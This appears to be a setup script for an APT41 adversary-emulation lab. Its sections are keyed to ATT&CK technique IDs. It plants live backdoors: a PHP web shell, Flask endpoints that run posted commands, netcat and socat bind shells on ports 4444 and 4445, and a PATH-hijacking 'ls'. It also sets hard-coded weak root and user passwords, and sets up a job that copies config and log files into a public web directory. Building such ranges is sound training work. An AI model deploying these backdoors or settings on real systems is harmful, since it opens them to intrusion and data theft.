############### APT 41 DUST

#
## Global commands
#
apt-get update
apt-get install -y python3 python3-pip sshpass curl socat

## SSH
apt-get install -y openssh-server
mkdir -p /var/run/sshd
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

pgrep -x "sshd" > /dev/null || /usr/sbin/sshd & 


# Root password
echo 'root:RootPass123' | chpasswd

# User attacker

useradd -m attacker -s /bin/bash
mkdir -p /home/attacker
echo 'attacker:Passw0rd' | chpasswd
usermod -aG sudo attacker

# DebianUser
useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser


################################################ End of Global Section

# T1102 - Web Service
pip install --break-system-packages flask requests
cat << 'EOF' > /home/attacker/webservice.py
from flask import Flask, request, jsonify

app = Flask(__name__)
data_store = {}

@app.route("/store", methods=["POST"])
def store():
    json_data = request.get_json()
    key = json_data.get("key")
    val = json_data.get("val")

    if key and val:
        data_store[key] = val
        return jsonify({"status": "stored"})

    return jsonify({"status": "failed"})

@app.route("/fetch/<key>", methods=["GET"])
def fetch(key):
    val = data_store.get(key)

    if val:
        return jsonify({"val": val})

    return jsonify({"val": "not found"})

app.run(host="0.0.0.0", port=8080)
EOF
if ! ss -tuln | grep -q ":8080 "; then
  su - attacker -c "python3 /home/attacker/webservice.py &"
 else echo "Port 8080 already in use";
fi




# T1213.006 - Databases

apt-get install -y mariadb-server
sed -i 's/^bind-address\s*=.*/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf
pgrep -x "mariadbd-safe" > /dev/null || mariadbd-safe &
sleep 5
mysql -u root -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'RootPassw0rd';FLUSH PRIVILEGES;"
mysql -u root -pRootPassw0rd -e "CREATE DATABASE sensitive_data;"
mysql -u root -pRootPassw0rd -e "CREATE USER 'attacker'@'%' IDENTIFIED BY 'Attack3rPass';"
mysql -u root -pRootPassw0rd -e "GRANT ALL PRIVILEGES ON sensitive_data.* TO 'attacker'@'%'; FLUSH PRIVILEGES;"
mysql -u root -pRootPassw0rd -e "USE sensitive_data; CREATE TABLE credentials(id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50), password VARCHAR(255));"
mysql -u root -pRootPassw0rd -e "INSERT INTO sensitive_data.credentials(username,password) VALUES ('admin','5f4dcc3b5aa765d61d8327deb882cf99');"



# 1543.003 - Windows Service
apt-get install -y samba samba-common-bin
printf '[global]\n   workgroup = WORKGROUP\n   server string = Samba Server\n   netbios name = debianA\n   security = user\n   map to guest = Bad User\n\n[share]\n   path = /srv/samba/share\n   browsable =yes\n   writable = yes\n   guest ok = yes\n   read only = no\n' > /etc/samba/smb.conf
mkdir -p /srv/samba/share
chmod -R 0777 /srv/samba/share
printf '#!/bin/sh\necho "This is a fake Windows Defend service file"\nsleep infinity\n' > /srv/samba/share/fake_service.sh
chmod +x /srv/samba/share/fake_service.sh
pgrep -x "smbd" > /dev/null || /usr/sbin/smbd --no-process-group --foreground &

# T1070.004
apt-get install -y sudo wget
pip install --break-system-packages paramiko
cat << 'EOF' > /root/exec.py
#!/usr/bin/env python3
import paramiko
import sys

hostname="127.0.0.1"
port=2222
username="attacker"
password="Passw0rd!"

client=paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect(hostname,port=port,username=username,password=password)

stdin, stdout, stderr = client.exec_command(sys.argv[1])

print(stdout.read().decode())

client.close()
EOF
chmod +x /root/exec.py
if ! ss -tuln | grep -q ":2222 "; then
  python3 /root/exec.py 2>&1 &
 else echo "Port 2222 already in use";
fi




# T1105
# nothing to do here

# T1505.003
printf '<?php if(isset($_REQUEST["cmd"])){echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>";} ?>' > /var/www/html/shell.php


# T1593.002

printf '<?php phpinfo(); ?>' > /var/www/html/server-status.php

# T1588.003

apt-get install -y openssl wget
mkdir -p  /var/www/html/root/certs
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-keyout  /var/www/html/root/certs/code_signing.key \
-out  /var/www/html/root/certs/code_signing.crt \
-subj "/CN=APT41 Code Signing/O=APT41 Labs/C=US"
openssl pkcs12 -export \
-out  /var/www/html/root/certs/code_signing.pfx \
-inkey  /var/www/html/root/certs/code_signing.key \
-in  /var/www/html/root/certs/code_signing.crt \
-passout pass:password123
chown www-data:root -R /var/www/html
 chmod ugo+rx -R /var/www/html/root/


pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &

# T1586.003

apt-get install -y unzip
pip install --break-system-packages boto3
curl -fsSL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/awscliv2.zip
unzip -o /tmp/awscliv2.zip -d /tmp
/tmp/aws/install --update
mkdir -p /home/attacker/.aws
cat <<EOF > /home/attacker/.aws/credentials
[default]
aws_access_key_id = AKIAFAKEKEYEXAMPLE
aws_secret_access_key = FakeSecretKeyExample1234567890
region = us-east-1
EOF
chown -R attacker:attacker /home/attacker/.aws
cat <<EOF > /home/attacker/.aws/config
[default]
region=us-east-1
EOF
chown attacker:attacker /home/attacker/.aws/config


# T1119

pip3 install --break-system-packages psutil schedule requests
cat <<'EOF' > /root/auto_collect.py
import psutil, schedule, time, shutil
import os

def collect_files():
    paths = ["/etc", "/var/log"]
    exts = [".conf", ".log"]
    collected = []

    for path in paths:
        for root, dirs, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in exts):
                    fullpath = os.path.join(root, file)
                    collected.append(fullpath)

    dest_dir = "/var/www/html/tmp/collected"
    os.makedirs(dest_dir, exist_ok=True)

    for f in collected:
        try:
            shutil.copy2(f, dest_dir)
        except Exception:
            pass

def job():
    collect_files()

schedule.every(1).minutes.do(job)

while True:
    schedule.run_pending()
    time.sleep(10)
EOF

python3 /root/auto_collect.py > /root/auto_collect.log 2>&1 &

grep -q "location /tmp/" /etc/nginx/conf.d/default.conf || sed -i '/server_name _;/a \    location /tmp/ {\n        autoindex on;\n    }' /etc/nginx/conf.d/default.conf
pkill nginx 
pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &
pgrep -x "nginx" > /dev/null || /usr/sbin/nginx &



# T1027.013

pip install --break-system-packages pycryptodome
chown attacker:attacker /home/attacker
cat << 'EOF' > /home/attacker/reverse.py
import sys
data=sys.stdin.read().strip()
print(data[::-1])
EOF
chmod +x /home/attacker/reverse.py

# T1074.001

apt-get install -y netcat-openbsd
cat << 'EOF' > /root/nc-listener.sh
# Alternative using named pipe
#!/bin/sh
rm -f /tmp/nc-pipe
mkfifo /tmp/nc-pipe
while true; do
    cat /tmp/nc-pipe | /bin/sh 2>&1 | nc -lk -p 4444 > /tmp/nc-pipe
done
EOF
chmod +x /root/nc-listener.sh
# Start listener in background

if ! ss -tuln | grep -q ":4444 "; then
  /root/nc-listener.sh &
 else echo "Port 4444 already in use";
fi


# T1567.002
## none

# T1036.004

useradd -m backupsvc -s /bin/bash
echo 'backupsvc:BackupPass123' | chpasswd
cat > /usr/local/bin/systemd-update << 'EOF'
#!/bin/sh
while true; do sleep 60; done
EOF
chmod +x /usr/local/bin/systemd-update


# T1596.005

#T1574.001

useradd -m devops -s /bin/bash
echo 'devops:DevopsPass123' | chpasswd
cat > /home/devops/ls << 'EOF'
#!/bin/sh
echo pwned >/tmp/hijack_log
id >> /tmp/hijack_log
exit
EOF
chmod +x /usr/local/bin/backup
chmod +x /home/devops/ls
chown devops:devops /home/devops/ls


#T1569.002

#!/bin/bash

pip3 install --break-system-packages flask
cat > /home/attacker/server.py << 'EOF'
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
 import subprocess
 cmd = request.form.get("cmd")
 if cmd:
  output = subprocess.getoutput(cmd)
  return output
 return "No cmd"
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=8081)
EOF
if ! ss -tuln | grep -q ":8081 "; then
  python3 /home/attacker/server.py &
 else echo "Port 8081 already in use";
fi


# T1560.001
sed -i '/^Components:/ {/non-free/! s/$/ non-free/}' /etc/apt/sources.list.d/debian.sources
chmod go+r /var/log/*.log
apt-get update
apt-get install -y rar

# T1071.001

pip install --break-system-packages flask requests
cat > /root/webshell.py << 'EOF'
from flask import Flask, request, jsonify
app=Flask(__name__)
@app.route("/cmd", methods=["POST"])
def cmd():
 import subprocess
 data=request.json
 if data and "command" in data:
  result=subprocess.run(data["command"], shell=True, capture_output=True, text=True)
  return jsonify({"output": result.stdout, "error": result.stderr})
 else:
  return jsonify({"error":"No command received"})
if __name__=="__main__":
 app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem","key.pem"))
EOF
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=hosta"

if ! ss -tuln | grep -q ":443 "; then
  python3 /root/webshell.py &
 else echo "Port 443 already in use";
fi


# T1594

echo '<html><body><h1>Company Home</h1><p>Contact: admin@victim.com</p></body></html>' > /var/www/html/index.html
echo 'User-agent: *\nDisallow: /secret\n' > /var/www/html/robots.txt
mkdir -p /var/www/html/secret
echo '<html><body><h1>Secret Directory</h1><p>Internal project details here</p></body></html>' > /var/www/html/secret/index.html


# T1583.007

pip install --break-system-packages flask
cat > /home/attacker/serverless.py << 'EOF'
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route("/", methods=["POST"])
def run_cmd():
    cmd = request.get_data(as_text=True)
    return subprocess.getoutput(cmd)

app.run(host="0.0.0.0", port=8082)
EOF
chown attacker:attacker /home/attacker/serverless.py
if ! ss -tuln | grep -q ":8082 "; then
  su attacker -c "python3 /home/attacker/serverless.py > /home/attacker/serverless.log 2>&1 &"
 else echo "Port 8082 already in use";
fi


# T1573.002

apt-get install -y  openssl
cat > /root/decrypt_and_execute.sh << 'EOF'
#!/bin/sh

PRIVATE=/root/private_key.pem
PUBLIC=/root/public_key.pem
ENC=/root/encrypted_command.bin
DEC=/root/decrypted_command.txt

echo "[*] Checking RSA keys..."

if [ ! -f "$PRIVATE" ]; then
    echo "[+] Generating RSA key pair"
    openssl genpkey -algorithm RSA -out "$PRIVATE" -pkeyopt rsa_keygen_bits:2048
    openssl rsa -pubout -in "$PRIVATE" -out "$PUBLIC"
    echo "[+] Public key saved to $PUBLIC"
fi

if [ ! -f "$ENC" ]; then
    echo "[!] Encrypted command not found: $ENC"
    exit 1
fi

echo "[*] Decrypting command..."

openssl pkeyutl -decrypt \
    -inkey "$PRIVATE" \
    -in "$ENC" \
    -out "$DEC"

if [ $? -ne 0 ]; then
    echo "[!] Decryption failed"
    exit 1
fi

echo "[*] Decrypted command:"
cat "$DEC"

echo "[*] Executing command..."
sh "$DEC"

EOF
chmod +x /root/decrypt_and_execute.sh
/root/decrypt_and_execute.sh

# T1553.002

apt-get install -y openssl
cat > /root/openssl.cnf << 'EOF'
[ req ]
distinguished_name=req_distinguished_name
[ req_distinguished_name ]
EOF
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /root/code_signing_key.pem -out /root/code_signing_cert.pem -subj "/C=US/ST=CA/L=SanFrancisco/O=APT41/CN=apt41.local" -config /root/openssl.cnf


if ! ss -tuln | grep -q ":4445 "; then
  socat TCP-LISTEN:4445,reuseaddr,fork EXEC:"/bin/bash" &
 else echo "Port 4445 already in use";
fi
